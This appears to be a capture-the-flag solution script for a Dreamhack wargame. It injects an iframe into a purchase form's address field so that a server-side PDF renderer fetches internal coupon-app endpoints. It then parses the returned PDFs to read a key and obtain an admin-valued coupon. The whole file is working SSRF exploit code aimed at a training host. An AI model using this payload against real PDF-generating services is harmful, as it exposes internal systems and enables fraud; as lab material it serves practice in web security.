from requests.sessions import Session
import fitz
import json


url = "http://host1.dreamhack.games:19091"

def loginSession():
    s = Session()
    s.post(url+"/login", data={"name": "guest", "password": "guest"})
    return s

def ssrfSend(ssrfUrl):
    ssrf = '<iframe src="http://coupon-app:8000'+ssrfUrl+'" height="1000px" width="1000px"></iframe>'

    s = loginSession()
    r = s.post(url+"/purchase/non/2", data={"name": "guest", "email":"guest@gmail.com", "address":ssrf})
    s.close()

    with open('tmp.pdf', 'wb') as f:
        f.write(r.content)

    doc = fitz.open('tmp.pdf')
    text = ""
    for page in doc:
        text = page.get_text()
    return text

p = ssrfSend(f"/generate?data=name_guest_value_10_admin_0_admin_1_value_2000")
print(p)

p = ssrfSend(f"/key?file=key_1")
msg = json.loads(p[51:].split("Pretty-print")[0])
print(msg)

p = ssrfSend("/get_coupon?key="+msg["msg"])
msg = json.loads(p[51:].split("Pretty-print")[0].replace("\n",""))
print(msg)

coupon = msg["coupon_data"]["coupon"]
print(coupon)